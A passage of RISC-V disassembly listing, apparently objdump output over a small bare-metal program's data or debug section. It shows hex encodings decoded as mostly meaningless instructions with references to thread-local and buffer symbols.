     a3e:	2748                	fld	fa0,136(a4)
     a40:	12f2                	slli	t0,t0,0x3c
     a42:	8000                	0x8000
     a44:	0000                	unimp
     a46:	0000                	unimp
     a48:	000c                	0xc
     a4a:	0000                	unimp
     a4c:	0000                	unimp
     a4e:	0000                	unimp
     a50:	00000a63          	beqz	zero,a64 <_tbss_end+0x9e0>
     a54:	a125                	j	e7c <_tbss_end+0xdf8>
     a56:	0001                	nop
     a58:	0200                	addi	s0,sp,256
     a5a:	745d                	lui	s0,0xffff7
     a5c:	0000                	unimp
     a5e:	0200                	addi	s0,sp,256
     a60:	4091                	li	ra,4
     a62:	2600                	fld	fs0,8(a2)
     a64:	1320                	addi	s0,sp,424
     a66:	8000                	0x8000
     a68:	0000                	unimp
     a6a:	0000                	unimp
     a6c:	000c                	0xc
     a6e:	0000                	unimp
     a70:	0000                	unimp
     a72:	0000                	unimp
     a74:	a125                	j	e9c <_tbss_end+0xe18>
     a76:	0001                	nop
     a78:	0200                	addi	s0,sp,256
     a7a:	745f 0000 0300      	0x3000000745f
     a80:	b091                	j	2c4 <_tbss_end+0x240>
     a82:	007f                	0x7f
     a84:	0000                	unimp
     a86:	0000                	unimp
     a88:	0800                	addi	s0,sp,16
     a8a:	08c1                	addi	a7,a7,16
     a8c:	0000                	unimp
     a8e:	0a99                	addi	s5,s5,6
     a90:	0000                	unimp
     a92:	7409                	lui	s0,0xfffe2
     a94:	0000                	unimp
     a96:	ff00                	sd	s0,56(a4)
     a98:	0800                	addi	s0,sp,16
     a9a:	08b6                	slli	a7,a7,0xd
     a9c:	0000                	unimp
     a9e:	0aa9                	addi	s5,s5,10
     aa0:	0000                	unimp
     aa2:	7409                	lui	s0,0xfffe2
     aa4:	0000                	unimp
     aa6:	0100                	addi	s0,sp,128
     aa8:	0800                	addi	s0,sp,16
     aaa:	08c1                	addi	a7,a7,16
     aac:	0000                	unimp
     aae:	0ab9                	addi	s5,s5,14
     ab0:	0000                	unimp
     ab2:	7409                	lui	s0,0xfffe2
     ab4:	0000                	unimp
     ab6:	0100                	addi	s0,sp,128
     ab8:	2900                	fld	fs0,16(a0)
     aba:	05be                	slli	a1,a1,0xf
     abc:	0000                	unimp
     abe:	3202                	fld	ft4,32(sp)
     ac0:	1202                	slli	tp,tp,0x20
     ac2:	8000                	0x8000
     ac4:	0000                	unimp
     ac6:	0000                	unimp
     ac8:	0058                	addi	a4,sp,4
     aca:	0000                	unimp
     acc:	0000                	unimp
     ace:	0000                	unimp
     ad0:	9c01                	subw	s0,s0,s0
     ad2:	0b2e                	slli	s6,s6,0xb
     ad4:	0000                	unimp
     ad6:	882a                	mv	a6,a0
     ad8:	0000                	unimp
     ada:	0200                	addi	s0,sp,256
     adc:	7332                	ld	t1,296(sp)
     ade:	0005                	c.nop	1
     ae0:	0200                	addi	s0,sp,256
     ae2:	4891                	li	a7,4
     ae4:	00034d2b          	0x34d2b
     ae8:	0200                	addi	s0,sp,256
     aea:	f134                	sd	a3,96(a0)
     aec:	000a                	c.slli	zero,0x2
     aee:	2c00                	fld	fs0,24(s0)
     af0:	2500                	fld	fs0,8(a0)
     af2:	00f0                	addi	a2,sp,76
     af4:	0000                	unimp
     af6:	3502                	fld	fa0,32(sp)
     af8:	08c1                	addi	a7,a7,16
     afa:	0000                	unimp
     afc:	9102                	jalr	sp
     afe:	2568                	fld	fa0,200(a0)
     b00:	02f0                	addi	a2,sp,332
     b02:	0000                	unimp
     b04:	3702                	fld	fa4,32(sp)
     b06:	0579                	addi	a0,a0,30
     b08:	0000                	unimp
     b0a:	9102                	jalr	sp
     b0c:	12402667          	0x12402667
     b10:	8000                	0x8000
     b12:	0000                	unimp
     b14:	0000                	unimp
     b16:	000c                	0xc
     b18:	0000                	unimp
     b1a:	0000                	unimp
     b1c:	0000                	unimp
     b1e:	a125                	j	f46 <_tbss_end+0xec2>
     b20:	0001                	nop
     b22:	0200                	addi	s0,sp,256
     b24:	7439                	lui	s0,0xfffee
     b26:	0000                	unimp
     b28:	0200                	addi	s0,sp,256
     b2a:	5891                	li	a7,-28
     b2c:	0000                	unimp
     b2e:	002d                	c.nop	11
     b30:	02000003          	lb	zero,32(zero) # 20 <_tdata_begin+0x20>
     b34:	0011161b          	slliw	a2,sp,0x1
     b38:	0080                	addi	s0,sp,64
     b3a:	0000                	unimp
     b3c:	ec00                	sd	s0,24(s0)
     b3e:	0000                	unimp
     b40:	0000                	unimp
     b42:	0000                	unimp
     b44:	0100                	addi	s0,sp,128
     b46:	a29c                	fsd	fa5,0(a3)
     b48:	2a00000b          	0x2a00000b
     b4c:	00000207          	0x207
     b50:	1b02                	slli	s6,s6,0x20
     b52:	0ba2                	slli	s7,s7,0x8
     b54:	0000                	unimp
     b56:	9102                	jalr	sp
     b58:	2a58                	fld	fa4,144(a2)
     b5a:	01e4                	addi	s1,sp,204
     b5c:	0000                	unimp
     b5e:	1b02                	slli	s6,s6,0x20
     b60:	08c1                	addi	a7,a7,16
     b62:	0000                	unimp
     b64:	9102                	jalr	sp
     b66:	2a50                	fld	fa2,144(a2)
     b68:	000004bb          	addw	s1,zero,zero
     b6c:	1b02                	slli	s6,s6,0x20
     b6e:	0ba8                	addi	a0,sp,472
     b70:	0000                	unimp
     b72:	9102                	jalr	sp
     b74:	2a48                	fld	fa0,144(a2)
     b76:	0139                	addi	sp,sp,14
     b78:	0000                	unimp
     b7a:	1b02                	slli	s6,s6,0x20
     b7c:	0ba2                	slli	s7,s7,0x8
     b7e:	0000                	unimp
     b80:	9102                	jalr	sp
     b82:	2640                	fld	fs0,136(a2)
     b84:	113e                	slli	sp,sp,0x2f
     b86:	8000                	0x8000
     b88:	0000                	unimp
     b8a:	0000                	unimp
     b8c:	00bc                	addi	a5,sp,72
     b8e:	0000                	unimp
     b90:	0000                	unimp
     b92:	0000                	unimp
     b94:	6928                	ld	a0,80(a0)
     b96:	0200                	addi	s0,sp,256
     b98:	c11f 0008 0200      	0x2000008c11f
     b9e:	6891                	lui	a7,0x4
     ba0:	0000                	unimp
     ba2:	08c1080f          	0x8c1080f
     ba6:	0000                	unimp
     ba8:	08b6080f          	0x8b6080f
     bac:	0000                	unimp
     bae:	382e                	fld	fa6,232(sp)
     bb0:	0002                	c.slli	zero,0x0
     bb2:	0100                	addi	s0,sp,128
     bb4:	4846                	lw	a6,80(sp)
     bb6:	0010                	0x10
     bb8:	0080                	addi	s0,sp,64
     bba:	0000                	unimp
     bbc:	ce00                	sw	s0,24(a2)
     bbe:	0000                	unimp
     bc0:	0000                	unimp
     bc2:	0000                	unimp
     bc4:	0100                	addi	s0,sp,128
     bc6:	2a9c                	fld	fa5,16(a3)
     bc8:	0088                	addi	a0,sp,64
     bca:	0000                	unimp
     bcc:	4601                	li	a2,0
     bce:	08c1                	addi	a7,a7,16
     bd0:	0000                	unimp
     bd2:	7fa89103          	lh	sp,2042(a7) # 47fa <_tbss_end+0x4776>
     bd6:	007a732f          	0x7a732f
     bda:	4601                	li	a2,0
     bdc:	08c1                	addi	a7,a7,16
     bde:	0000                	unimp
     be0:	7fa09103          	lh	sp,2042(ra)
     be4:	7e25                	lui	t3,0xfffe9
     be6:	01000003          	lb	zero,16(zero) # 10 <_tdata_begin+0x10>
     bea:	c14c                	sw	a1,4(a0)
     bec:	0008                	0x8
     bee:	0200                	addi	s0,sp,256
     bf0:	6891                	lui	a7,0x4
     bf2:	f025                	bnez	s0,b52 <_tbss_end+0xace>
     bf4:	0000                	unimp
     bf6:	0100                	addi	s0,sp,128
     bf8:	0008b65b          	0x8b65b
     bfc:	0200                	addi	s0,sp,256
     bfe:	5791                	li	a5,-28
     c00:	1025                	c.nop	-23
     c02:	0005                	c.nop	1
     c04:	0100                	addi	s0,sp,128
     c06:	c161                	beqz	a0,cc6 <_tbss_end+0xc42>
     c08:	0008                	0x8
     c0a:	0200                	addi	s0,sp,256
     c0c:	4891                	li	a7,4
     c0e:	a026                	fsd	fs1,0(sp)
     c10:	0010                	0x10
     c12:	0080                	addi	s0,sp,64
     c14:	0000                	unimp
     c16:	6e00                	ld	s0,24(a2)
     c18:	0000                	unimp
     c1a:	0000                	unimp
     c1c:	0000                	unimp
     c1e:	2800                	fld	fs0,16(s0)
     c20:	0069                	c.nop	26
     c22:	6401                	0x6401
     c24:	08c1                	addi	a7,a7,16
     c26:	0000                	unimp
     c28:	9102                	jalr	sp
     c2a:	2660                	fld	fs0,200(a2)
     c2c:	10a6                	slli	ra,ra,0x29
     c2e:	8000                	0x8000
     c30:	0000                	unimp
     c32:	0000                	unimp
     c34:	0052                	c.slli	zero,0x14
     c36:	0000                	unimp
     c38:	0000                	unimp
     c3a:	0000                	unimp
     c3c:	3225                	addiw	tp,tp,-23
     c3e:	0000                	unimp
     c40:	0100                	addi	s0,sp,128
     c42:	0008c167          	0x8c167
     c46:	0200                	addi	s0,sp,256
     c48:	4091                	li	ra,4
     c4a:	bc26                	fsd	fs1,56(sp)
     c4c:	0010                	0x10
     c4e:	0080                	addi	s0,sp,64
     c50:	0000                	unimp
     c52:	3c00                	fld	fs0,56(s0)
     c54:	0000                	unimp
     c56:	0000                	unimp
     c58:	0000                	unimp
     c5a:	2800                	fld	fs0,16(s0)
     c5c:	006a                	c.slli	zero,0x1a
     c5e:	6b01                	0x6b01
     c60:	08c1                	addi	a7,a7,16
     c62:	0000                	unimp
     c64:	9102                	jalr	sp
     c66:	2658                	fld	fa4,136(a2)
     c68:	10c2                	slli	ra,ra,0x30
     c6a:	8000                	0x8000
     c6c:	0000                	unimp
     c6e:	0000                	unimp
     c70:	0022                	c.slli	zero,0x8
     c72:	0000                	unimp
     c74:	0000                	unimp
     c76:	0000                	unimp
     c78:	cc25                	beqz	s0,cf0 <_tbss_end+0xc6c>
     c7a:	0000                	unimp
     c7c:	0100                	addi	s0,sp,128
     c7e:	c16e                	sw	s11,128(sp)
     c80:	0008                	0x8
     c82:	0300                	addi	s0,sp,384
     c84:	b891                	j	4d8 <_tbss_end+0x454>
     c86:	007f                	0x7f
     c88:	0000                	unimp
     c8a:	0000                	unimp
     c8c:	2a00                	fld	fs0,16(a2)
     c8e:	0000                	unimp
     c90:	0200                	addi	s0,sp,256
     c92:	7c00                	ld	s0,56(s0)
     c94:	0002                	c.slli	zero,0x0
     c96:	0800                	addi	s0,sp,16
     c98:	a901                	j	10a8 <_tbss_end+0x1024>
     c9a:	00000003          	lb	zero,0(zero) # 0 <_tdata_begin>
     c9e:	0000                	unimp
     ca0:	0080                	addi	s0,sp,64
     ca2:	0000                	unimp
     ca4:	c600                	sw	s0,8(a2)
     ca6:	0001                	nop
     ca8:	0080                	addi	s0,sp,64
     caa:	0000                	unimp
     cac:	c700                	sw	s0,8(a4)
     cae:	0005                	c.nop	1
     cb0:	d100                	sw	s0,32(a0)
     cb2:	0005                	c.nop	1
     cb4:	fa00                	sd	s0,48(a2)
     cb6:	0005                	c.nop	1
     cb8:	0100                	addi	s0,sp,128
     cba:	2a80                	fld	fs0,16(a3)
     cbc:	0000                	unimp
     cbe:	0200                	addi	s0,sp,256
     cc0:	9000                	0x9000
     cc2:	0002                	c.slli	zero,0x0
     cc4:	0800                	addi	s0,sp,16
     cc6:	a101                	j	10c6 <_tbss_end+0x1042>
     cc8:	dc000007          	0xdc000007
     ccc:	0014                	0x14
     cce:	0080                	addi	s0,sp,64
     cd0:	0000                	unimp
     cd2:	0a00                	addi	s0,sp,272
     cd4:	0015                	c.nop	5
     cd6:	0080                	addi	s0,sp,64
     cd8:	0000                	unimp
     cda:	0600                	addi	s0,sp,768
     cdc:	0006                	c.slli	zero,0x1
     cde:	d100                	sw	s0,32(a0)
     ce0:	0005                	c.nop	1
     ce2:	fa00                	sd	s0,48(a2)
     ce4:	0005                	c.nop	1
     ce6:	0100                	addi	s0,sp,128
     ce8:	c680                	sw	s0,8(a3)
     cea:	04000017          	auipc	zero,0x4000
     cee:	a400                	fsd	fs0,8(s0)
     cf0:	0002                	c.slli	zero,0x0
     cf2:	0800                	addi	s0,sp,16
     cf4:	2f01                	sext.w	t5,t5
     cf6:	0008                	0x8
     cf8:	0c00                	addi	s0,sp,528
     cfa:	06d9                	addi	a3,a3,22
     cfc:	0000                	unimp
     cfe:	0706                	slli	a4,a4,0x1
     d00:	0000                	unimp
     d02:	150a                	slli	a0,a0,0x22
     d04:	8000                	0x8000
     d06:	0000                	unimp
     d08:	0000                	unimp
     d0a:	1214                	addi	a3,sp,288
     d0c:	0000                	unimp
     d0e:	0000                	unimp
     d10:	0000                	unimp
     d12:	082d                	addi	a6,a6,11
     d14:	0000                	unimp
     d16:	0102                	slli	sp,sp,0x0
     d18:	8d06                	mv	s10,ra
     d1a:	02000003          	lb	zero,32(zero) # 4000d0a <_tbss_end+0x4000c86>
     d1e:	0801                	addi	a6,a6,0
     d20:	0000038b          	0x38b
     d24:	0202                	slli	tp,tp,0x0
     d26:	b005                	j	546 <_tbss_end+0x4c2>
     d28:	02000003          	lb	zero,32(zero) # 20 <_tdata_begin+0x20>
     d2c:	0702                	slli	a4,a4,0x0
     d2e:	021c                	addi	a5,sp,256
     d30:	0000                	unimp
     d32:	69050403          	lb	s0,1680(a0) # 690 <_tbss_end+0x60c>
     d36:	746e                	ld	s0,248(sp)
     d38:	0400                	addi	s0,sp,512
     d3a:	0049                	c.nop	18
     d3c:	0000                	unimp
     d3e:	5005                	c.li	zero,-31
     d40:	0000                	unimp
     d42:	0500                	addi	s0,sp,640
     d44:	0049                	c.nop	18
     d46:	0000                	unimp
     d48:	0402                	slli	s0,s0,0x0
     d4a:	00006607          	0x6607
     d4e:	0200                	addi	s0,sp,256
     d50:	0508                	addi	a0,sp,640
     d52:	000000db          	0xdb
     d56:	5706                	lw	a4,96(sp)
     d58:	04000003          	lb	zero,64(zero) # 40 <buf.2990>
     d5c:	1969                	addi	s2,s2,-6
     d5e:	0079                	c.nop	30
     d60:	0000                	unimp
     d62:	0802                	slli	a6,a6,0x0
     d64:	00006107          	0x6107
     d68:	0600                	addi	s0,sp,768
     d6a:	07e5                	addi	a5,a5,25
     d6c:	0000                	unimp
     d6e:	e804                	sd	s1,16(s0)
     d70:	791a                	ld	s2,416(sp)
     d72:	0000                	unimp
     d74:	0600                	addi	s0,sp,768
     d76:	0359                	addi	t1,t1,22
     d78:	0000                	unimp
     d7a:	3c05                	addiw	s8,s8,-31
     d7c:	6d14                	ld	a3,24(a0)
     d7e:	0000                	unimp
     d80:	0400                	addi	s0,sp,512
     d82:	008c                	addi	a1,sp,64
     d84:	0000                	unimp
     d86:	e706                	sd	ra,392(sp)
     d88:	05000007          	0x5000007
     d8c:	1552                	slli	a0,a0,0x34
     d8e:	0080                	addi	s0,sp,64
     d90:	0000                	unimp
     d92:	9d05                	subw	a0,a0,s1
     d94:	0000                	unimp
     d96:	0600                	addi	s0,sp,768
     d98:	0000053f 7917d106 	0x7917d1060000053f
     da0:	0000                	unimp
     da2:	0200                	addi	s0,sp,256
     da4:	0508                	addi	a0,sp,640
     da6:	00d6                	slli	ra,ra,0x15
     da8:	0000                	unimp
     daa:	1002                	c.slli	zero,0x20
     dac:	0a04                	addi	s1,sp,272
     dae:	07000003          	lb	zero,112(zero) # 70 <buf.2990+0x30>
     db2:	026a                	slli	tp,tp,0x1a
     db4:	0000                	unimp
     db6:	5e06                	lw	t3,96(sp)
     db8:	1701                	addi	a4,a4,-32
     dba:	005f 0000 4606      	0x46060000005f
     dc0:	07000003          	lb	zero,112(zero) # 70 <buf.2990+0x30>
     dc4:	0e2e                	slli	t3,t3,0xb
     dc6:	0066                	c.slli	zero,0x19
     dc8:	0000                	unimp
     dca:	9b06                	add	s6,s6,ra
     dcc:	0004                	0x4
     dce:	0700                	addi	s0,sp,896
     dd0:	0e74                	addi	a3,sp,796
     dd2:	0066                	c.slli	zero,0x19
     dd4:	0000                	unimp
     dd6:	3d06                	fld	fs10,96(sp)
     dd8:	0005                	c.nop	1
     dda:	0700                	addi	s0,sp,896
     ddc:	00661793          	slli	a5,a2,0x6
     de0:	0000                	unimp
     de2:	0408                	addi	a0,sp,512
     de4:	1b03a507          	flw	fa0,432(t2)
     de8:	0001                	nop
     dea:	0900                	addi	s0,sp,144
     dec:	0264                	addi	s1,sp,268
     dee:	0000                	unimp
     df0:	c80ca707          	flw	fa4,-896(s9)
     df4:	0000                	unimp
     df6:	0900                	addi	s0,sp,144
     df8:	01f0                	addi	a2,sp,204
     dfa:	0000                	unimp
     dfc:	1b13a807          	flw	fa6,433(t2)
     e00:	0001                	nop
     e02:	0000                	unimp
     e04:	340a                	fld	fs0,160(sp)
     e06:	0000                	unimp
     e08:	2b00                	fld	fs0,16(a4)
     e0a:	0001                	nop
     e0c:	0b00                	addi	s0,sp,400
     e0e:	0079                	c.nop	30
     e10:	0000                	unimp
     e12:	080c0003          	lb	zero,128(s8) # 37fe <_tbss_end+0x377a>
     e16:	4f09a207          	flw	ft4,1264(s3)
     e1a:	0001                	nop
     e1c:	0d00                	addi	s0,sp,656
     e1e:	0456                	slli	s0,s0,0x15
     e20:	0000                	unimp
     e22:	4907a407          	flw	fs0,1168(a5)
     e26:	0000                	unimp
     e28:	0000                	unimp
     e2a:	5e0d                	li	t3,-29
     e2c:	0004                	0x4
     e2e:	0700                	addi	s0,sp,896
     e30:	05a9                	addi	a1,a1,10
     e32:	00f9                	addi	ra,ra,30
     e34:	0000                	unimp
     e36:	0004                	0x4
     e38:	d806                	sw	ra,48(sp)
     e3a:	07000003          	lb	zero,112(zero) # 70 <buf.2990+0x30>
     e3e:	03aa                	slli	t2,t2,0xa
     e40:	0000012b          	0x12b
     e44:	080e                	slli	a6,a6,0x3
     e46:	0904080f          	0x904080f
     e4a:	0000                	unimp
     e4c:	e806                	sd	ra,16(sp)
     e4e:	0004                	0x4
     e50:	0800                	addi	s0,sp,16
     e52:	1919                	addi	s2,s2,-26
     e54:	005f 0000 6c06      	0x6c060000005f
     e5a:	09000003          	lb	zero,144(zero) # 90 <_tbss_end+0xc>
     e5e:	0d0c                	addi	a1,sp,656
     e60:	0049                	c.nop	18
     e62:	0000                	unimp
     e64:	a706                	fsd	ft1,392(sp)
     e66:	0001                	nop
     e68:	0800                	addi	s0,sp,16
     e6a:	016f1b23          	sh	s6,22(t5) # 246de <_tbss_end+0x2465a>
     e6e:	0000                	unimp
     e70:	b810                	fsd	fa2,48(s0)
     e72:	0001                	nop
     e74:	2000                	fld	fs0,0(s0)
     e76:	3408                	fld	fa0,40(s0)
     e78:	e108                	sd	a0,0(a0)
     e7a:	0001                	nop
     e7c:	0d00                	addi	s0,sp,656
     e7e:	03f9                	addi	t2,t2,30
     e80:	0000                	unimp
     e82:	3608                	fld	fa0,40(a2)
     e84:	0001e113          	ori	sp,gp,0
     e88:	0000                	unimp
     e8a:	5f11                	li	t5,-28
     e8c:	3708006b          	0x3708006b
     e90:	00004907          	flq	fs2,0(zero) # 0 <_tdata_begin>
     e94:	0800                	addi	s0,sp,16
     e96:	410d                	li	sp,3
     e98:	0004                	0x4
     e9a:	0800                	addi	s0,sp,16
     e9c:	00490b37          	lui	s6,0x490
     ea0:	0000                	unimp
     ea2:	0d0c                	addi	a1,sp,656
     ea4:	0000019b          	sext.w	gp,zero
     ea8:	3708                	fld	fa0,40(a4)
     eaa:	4914                	lw	a3,16(a0)
     eac:	0000                	unimp
     eae:	1000                	addi	s0,sp,32
     eb0:	280d                	addiw	a6,a6,3
     eb2:	0005                	c.nop	1
     eb4:	0800                	addi	s0,sp,16
     eb6:	00491b37          	lui	s6,0x491
     eba:	0000                	unimp
     ebc:	1114                	addi	a3,sp,160
     ebe:	785f 0800 0b38      	0xb380800785f
     ec4:	000001e7          	jalr	gp,zero
     ec8:	0018                	0x18
     eca:	0812                	slli	a6,a6,0x4
     ecc:	00000187          	0x187
     ed0:	630a                	ld	t1,128(sp)
     ed2:	0001                	nop
     ed4:	f700                	sd	s0,40(a4)
     ed6:	0001                	nop
     ed8:	0b00                	addi	s0,sp,400
     eda:	0079                	c.nop	30
     edc:	0000                	unimp
     ede:	0000                	unimp
     ee0:	df10                	sw	a2,56(a4)
     ee2:	0001                	nop
     ee4:	2400                	fld	fs0,8(s0)
     ee6:	3c08                	fld	fa0,56(s0)
     ee8:	7a08                	ld	a0,48(a2)
     eea:	0002                	c.slli	zero,0x0
     eec:	0d00                	addi	s0,sp,656
     eee:	000000c3          	fmadd.s	ft1,ft0,ft0,ft0,rne
     ef2:	3e08                	fld	fa0,56(a2)
     ef4:	4909                	li	s2,2
     ef6:	0000                	unimp
     ef8:	0000                	unimp
     efa:	ad0d                	j	152c <_tbss_end+0x14a8>
     efc:	0004                	0x4
     efe:	0800                	addi	s0,sp,16
     f00:	0049093f 0d040000 	0xd0400000049093f
     f08:	00f6                	slli	ra,ra,0x1d
     f0a:	0000                	unimp
     f0c:	4008                	lw	a0,0(s0)
     f0e:	4909                	li	s2,2
     f10:	0000                	unimp
     f12:	0800                	addi	s0,sp,16
     f14:	b40d                	j	936 <_tbss_end+0x8b2>
     f16:	0005                	c.nop	1
     f18:	0800                	addi	s0,sp,16
     f1a:	0941                	addi	s2,s2,16
     f1c:	0049                	c.nop	18
     f1e:	0000                	unimp
     f20:	0d0c                	addi	a1,sp,656
     f22:	032a                	slli	t1,t1,0xa
     f24:	0000                	unimp
     f26:	4208                	lw	a0,0(a2)
     f28:	4909                	li	s2,2
     f2a:	0000                	unimp
     f2c:	1000                	addi	s0,sp,32
     f2e:	a30d                	j	1450 <_tbss_end+0x13cc>
     f30:	0004                	0x4
     f32:	0800                	addi	s0,sp,16
     f34:	00490943          	fmadd.s	fs2,fs2,ft4,ft0,rne
     f38:	0000                	unimp
     f3a:	0d14                	addi	a3,sp,656
     f3c:	052d                	addi	a0,a0,11
     f3e:	0000                	unimp
     f40:	4408                	lw	a0,8(s0)
     f42:	4909                	li	s2,2
     f44:	0000                	unimp
     f46:	1800                	addi	s0,sp,48
     f48:	ba0d                	j	87a <_tbss_end+0x7f6>
     f4a:	08000003          	lb	zero,128(zero) # 80 <buflen.2991>
     f4e:	0945                	addi	s2,s2,17
     f50:	0049                	c.nop	18
     f52:	0000                	unimp
     f54:	0d1c                	addi	a5,sp,656
     f56:	0568                	addi	a0,sp,652
     f58:	0000                	unimp
     f5a:	4608                	lw	a0,8(a2)
     f5c:	4909                	li	s2,2
     f5e:	0000                	unimp
     f60:	2000                	fld	fs0,0(s0)
     f62:	1300                	addi	s0,sp,416
     f64:	0105                	addi	sp,sp,1
     f66:	0000                	unimp
     f68:	0208                	addi	a0,sp,256
     f6a:	4f08                	lw	a0,24(a4)
     f6c:	c008                	sw	a0,0(s0)
     f6e:	0002                	c.slli	zero,0x0
     f70:	0d00                	addi	s0,sp,656
     f72:	017d                	addi	sp,sp,31
     f74:	0000                	unimp
     f76:	5008                	lw	a0,32(s0)
     f78:	c00a                	sw	sp,0(sp)
     f7a:	0002                	c.slli	zero,0x0
     f7c:	0000                	unimp
     f7e:	0014                	0x14
     f80:	0000                	unimp
     f82:	0800                	addi	s0,sp,16
     f84:	0951                	addi	s2,s2,20
     f86:	02c0                	addi	s0,sp,324
     f88:	0000                	unimp
     f8a:	0100                	addi	s0,sp,128
     f8c:	da14                	sw	a3,48(a2)
     f8e:	0004                	0x4
     f90:	0800                	addi	s0,sp,16
     f92:	01630a53          	fadd.s	fs4,ft6,fs6,rne
     f96:	0000                	unimp
     f98:	0200                	addi	s0,sp,256
     f9a:	2a14                	fld	fa3,16(a2)
     f9c:	0001                	nop
     f9e:	0800                	addi	s0,sp,16
     fa0:	0a56                	slli	s4,s4,0x15
     fa2:	00000163          	beqz	zero,fa4 <_tbss_end+0xf20>
     fa6:	0204                	addi	s1,sp,256
     fa8:	0a00                	addi	s0,sp,272
     faa:	0000015b          	0x15b
     fae:	02d0                	addi	a2,sp,324
     fb0:	0000                	unimp
     fb2:	0000790b          	0x790b
     fb6:	1f00                	addi	s0,sp,944
     fb8:	1300                	addi	s0,sp,416
     fba:	00000333          	add	t1,zero,zero
     fbe:	0318                	addi	a4,sp,384
     fc0:	6208                	ld	a0,0(a2)
     fc2:	1408                	addi	a0,sp,544
     fc4:	0d000003          	lb	zero,208(zero) # d0 <_tbss_end+0x4c>
     fc8:	03f9                	addi	t2,t2,30
     fca:	0000                	unimp
     fcc:	6308                	ld	a0,0(a4)
     fce:	1412                	slli	s0,s0,0x24
     fd0:	00000003          	lb	zero,0(zero) # 0 <_tdata_begin>
     fd4:	110d                	addi	sp,sp,-29
     fd6:	0004                	0x4
     fd8:	0800                	addi	s0,sp,16
     fda:	0664                	addi	s1,sp,780
     fdc:	0049                	c.nop	18
     fde:	0000                	unimp
     fe0:	0d08                	addi	a0,sp,656
     fe2:	0185                	addi	gp,gp,1
     fe4:	0000                	unimp
     fe6:	6608                	ld	a0,8(a2)
     fe8:	1a09                	addi	s4,s4,-30
     fea:	10000003          	lb	zero,256(zero) # 100 <_tbss_end+0x7c>
     fee:	0514                	addi	a3,sp,640
     ff0:	0001                	nop
     ff2:	0800                	addi	s0,sp,16
     ff4:	027a1e67          	0x27a1e67
     ff8:	0000                	unimp
     ffa:	0110                	addi	a2,sp,128
     ffc:	1200                	addi	s0,sp,288
     ffe:	d008                	sw	a0,32(s0)
    1000:	0002                	c.slli	zero,0x0
    1002:	0a00                	addi	s0,sp,272
    1004:	032a                	slli	t1,t1,0xa
    1006:	0000                	unimp
    1008:	032a                	slli	t1,t1,0xa
    100a:	0000                	unimp
    100c:	0000790b          	0x790b
    1010:	1f00                	addi	s0,sp,944
    1012:	1200                	addi	s0,sp,288
    1014:	3008                	fld	fa0,32(s0)
    1016:	15000003          	lb	zero,336(zero) # 150 <_tbss_end+0xcc>
    101a:	c410                	sw	a2,8(s0)
    101c:	10000003          	lb	zero,256(zero) # 100 <_tbss_end+0x7c>
    1020:	7a08                	ld	a0,48(a2)
    1022:	5908                	lw	a0,48(a0)
    1024:	0d000003          	lb	zero,208(zero) # d0 <_tbss_end+0x4c>
    1028:	00ea                	slli	ra,ra,0x1a
    102a:	0000                	unimp
    102c:	7b08                	ld	a0,48(a4)
    102e:	5911                	li	s2,-28
    1030:	00000003          	lb	zero,0(zero) # 0 <_tdata_begin>
    1034:	580d                	li	a6,-29
    1036:	0006                	c.slli	zero,0x1
    1038:	0800                	addi	s0,sp,16
    103a:	067c                	addi	a5,sp,780
    103c:	0049                	c.nop	18
    103e:	0000                	unimp
    1040:	0008                	0x8
    1042:	0812                	slli	a6,a6,0x4
    1044:	0034                	addi	a3,sp,8
    1046:	0000                	unimp
    1048:	e310                	sd	a2,0(a4)
    104a:	b0000003          	lb	zero,-1280(zero) # fffffffffffffb00 <_end+0xffffffff7ffe4880>
    104e:	ba08                	fsd	fa0,48(a2)
    1050:	a208                	fsd	fa0,0(a2)
    1052:	0004                	0x4
    1054:	1100                	addi	s0,sp,160
    1056:	705f 0800 12bb      	0x12bb0800705f
    105c:	0359                	addi	t1,t1,22
    105e:	0000                	unimp
    1060:	1100                	addi	s0,sp,160
    1062:	725f 0800 07bc      	0x7bc0800725f
    1068:	0049                	c.nop	18
    106a:	0000                	unimp
    106c:	1108                	addi	a0,sp,160
    106e:	775f 0800 07bd      	0x7bd0800775f
    1074:	0049                	c.nop	18
    1076:	0000                	unimp
    1078:	0d0c                	addi	a1,sp,656
    107a:	00000123          	sb	zero,2(zero) # 2 <_tdata_begin+0x2>
    107e:	be08                	fsd	fa0,56(a2)
    1080:	3b09                	addiw	s6,s6,-30
    1082:	0000                	unimp
    1084:	1000                	addi	s0,sp,32
    1086:	0f0d                	addi	t5,t5,3
    1088:	0002                	c.slli	zero,0x0
    108a:	0800                	addi	s0,sp,16
    108c:	003b09bf 11120000 	0x11120000003b09bf
    1094:	625f 0066 c008      	0xc0080066625f
    109a:	3111                	addiw	sp,sp,-28
    109c:	18000003          	lb	zero,384(zero) # 180 <_tbss_end+0xfc>
    10a0:	7f0d                	lui	t5,0xfffe3
    10a2:	0000                	unimp
    10a4:	0800                	addi	s0,sp,16
    10a6:	07c1                	addi	a5,a5,16
    10a8:	0049                	c.nop	18
    10aa:	0000                	unimp
    10ac:	0d28                	addi	a0,sp,664
    10ae:	00000113          	li	sp,0
    10b2:	c808                	sw	a0,16(s0)
    10b4:	5b0a                	lw	s6,160(sp)
    10b6:	0001                	nop
    10b8:	3000                	fld	fs0,32(s0)
    10ba:	cf0d                	beqz	a4,10f4 <_tbss_end+0x1070>
    10bc:	0001                	nop
    10be:	0800                	addi	s0,sp,16
    10c0:	1dca                	slli	s11,s11,0x32
    10c2:	0626                	slli	a2,a2,0x9
    10c4:	0000                	unimp
    10c6:	0d38                	addi	a4,sp,664
    10c8:	027f                	0x27f
    10ca:	0000                	unimp
    10cc:	cc08                	sw	a0,24(s0)
    10ce:	501d                	c.li	zero,-25
    10d0:	0006                	c.slli	zero,0x1
    10d2:	4000                	lw	s0,0(s0)
    10d4:	660d                	lui	a2,0x3
    10d6:	0004                	0x4
    10d8:	0800                	addi	s0,sp,16
    10da:	06740dcf          	fnmadd.q	fs11,fs0,ft7,ft0,rne
    10de:	0000                	unimp
    10e0:	0d48                	addi	a0,sp,660
    10e2:	0582                	slli	a1,a1,0x0
    10e4:	0000                	unimp
    10e6:	d008                	sw	a0,32(s0)
    10e8:	8e09                	sub	a2,a2,a0
    10ea:	0006                	c.slli	zero,0x1
    10ec:	5000                	lw	s0,32(s0)
    10ee:	5f11                	li	t5,-28
    10f0:	6275                	lui	tp,0x1d
    10f2:	0800                	addi	s0,sp,16
    10f4:	033111d3          	fadd.d	ft3,ft2,fs3,rtz
    10f8:	0000                	unimp
    10fa:	1158                	addi	a4,sp,164
    10fc:	755f 0070 d408      	0xd4080070755f
    1102:	5912                	lw	s2,36(sp)
